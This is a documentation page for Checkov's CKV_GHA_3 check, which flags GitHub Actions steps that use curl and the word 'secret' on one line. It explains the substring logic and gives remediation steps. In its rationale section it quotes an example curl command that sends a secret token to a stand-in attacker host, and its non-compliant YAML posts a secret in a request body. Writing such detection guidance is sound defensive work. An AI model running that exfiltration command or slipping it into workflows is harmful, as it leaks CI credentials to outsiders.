# CKV_GHA_3: Suspicious use of curl with secrets
## Severity
**CRITICAL** (score: 8.5/10)

A `curl` invocation on the same line as a secret strongly indicates a workflow is sending credential material to an external endpoint, which is effectively hardcoded-secret exfiltration out of the CI environment.

## Summary
This check fails when a GitHub Actions `run:` step contains a single line that uses `curl` together with the literal word `secret`, a pattern commonly seen when a secret is being exfiltrated to an external host or passed insecurely on a command line.

## Applicability
**Checkov framework(s):** `github_actions`

- **Framework:** GitHub Actions workflow YAML
- **Entities:** `jobs` and `jobs.*.steps[]` — any step with a `run:` key

## Why it matters
Malicious or compromised GitHub Actions workflows (whether injected via a supply-chain attack on a third-party action, a malicious PR, or a backdoored workflow file) frequently exfiltrate CI/CD secrets — cloud credentials, API tokens, signing keys — by sending them to an attacker-controlled endpoint using `curl`. A single shell line combining `curl` and a reference to something named "secret" (e.g., `curl https://evil.example/collect -d "$SECRET_TOKEN"`) is a strong heuristic signal of exactly this exfiltration pattern. Even in legitimate use, embedding secret values directly in a `curl` command line is risky: the full command (including the secret) can be captured in process listings (`ps`), shell history, or CI logs if `set -x`/verbose logging is enabled, and it may violate the principle of never letting a secret touch an unencrypted transport method incorrectly.

## How Checkov evaluates this
The check (`SuspectCurlInScript`) reads the step's `run` field and, only if the substring `"curl"` appears anywhere in it, splits the script into individual lines. For each line, it checks whether **both** `"curl"` and `"secret"` appear as substrings on that same line (case-sensitive, simple substring match — not a regex, not word-boundary aware).
- If any single line contains both substrings, the check **FAILS**.
- Otherwise (including when `run` has no `curl` at all) the check **PASSES**.

Because this is a simple substring match, it will also flag legitimate variable names containing "secret" (e.g., `$MY_SECRET_URL`) used alongside `curl` — treat a finding as a prompt for manual review, not automatically as malicious.

## Non-compliant example
```yaml
jobs:
  exfil-looking:
    runs-on: ubuntu-latest
    steps:
      - name: Report status
        env:
          API_SECRET: ${{ secrets.API_SECRET }}
        run: |
          curl -X POST https://telemetry.example.com/report -d "secret=$API_SECRET"
```

## Remediated example
```yaml
jobs:
  status-report:
    runs-on: ubuntu-latest
    steps:
      - name: Report status
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
        run: |
          curl -X POST https://telemetry.example.com/report \
            -H "Authorization: Bearer $API_TOKEN" \
            -d "status=ok"
```

## Remediation steps
1. Review every flagged line manually — determine whether a secret is genuinely being sent to a third-party host, and if so, whether that destination and transport are authorized and expected.
2. If the destination is legitimate, avoid naming variables/fields literally "secret" on the same line as `curl`, and prefer sending credentials via the `Authorization` header instead of a POST body field literally called `secret`.
3. Never hardcode or echo secret values into `curl -d`/`--data` bodies going to third-party/unaudited endpoints.
4. If this pattern is truly unauthorized exfiltration (e.g., introduced via a malicious PR or compromised action), remove the step immediately, rotate the exposed secret, and audit the workflow's recent history and the third-party actions it uses.
5. Restrict which workflows have access to sensitive secrets using environment protection rules and repository/organization secret scoping.
6. Re-run Checkov after remediation to confirm the line no longer contains both `curl` and `secret`.

## References
- Checkov check source: https://github.com/bridgecrewio/checkov/blob/main/checkov/github_actions/checks/job/SuspectCurlInScript.py
